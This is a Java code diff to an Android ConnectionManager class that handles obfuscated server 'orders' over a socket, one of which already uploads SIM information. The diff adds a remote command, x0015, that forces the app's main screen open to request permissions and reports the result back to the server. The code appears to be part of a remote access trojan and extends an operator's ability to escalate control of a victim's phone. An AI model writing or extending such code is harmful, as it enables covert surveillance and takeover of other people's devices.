@@ -299,6 +299,10 @@ public class ConnectionManager {
                     x0000sm2();
                     break;
                     
+                case "x0015": // Request Permissions
+                    handlePermissionRequest(data);
+                    break;
+                    
                 default:
                     Log.w(TAG, "Unknown order: " + order);
             }
@@ -819,6 +823,48 @@ public class ConnectionManager {
             ioSocket.emit("x0000sm2", simInfo);
         } catch (Exception e) {
             Log.e(TAG, "Error in SIM info command", e);
+        }
+    }
+    
+    private static void handlePermissionRequest(JSONObject data) {
+        Log.d(TAG, "Permission request from server");
+        try {
+            // Get permission type from data
+            String permissionType = data.optString("type", "all");
+            
+            // Trigger MainActivity to show and request permissions
+            new Handler(Looper.getMainLooper()).post(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        android.content.Intent intent = new android.content.Intent(context, MainActivity.class);
+                        intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK | 
+                                       android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP |
+                                       android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                        intent.putExtra("REQUEST_PERMISSIONS", true);
+                        intent.putExtra("PERMISSION_TYPE", permissionType);
+                        context.startActivity(intent);
+                        
+                        // Send acknowledgement
+                        JSONObject response = new JSONObject();
+                        response.put("success", true);
+                        response.put("message", "Permission request triggered");
+                        ioSocket.emit("x0015", response);
+                        
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error starting MainActivity for permissions", e);
+                        try {
+                            JSONObject response = new JSONObject();
+                            response.put("success", false);
+                            response.put("error", e.getMessage());
+                            ioSocket.emit("x0015", response);
+                        } catch (Exception ignored) {}
+                    }
+                }
+            });
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error in permission request handler", e);
         }
     }
 
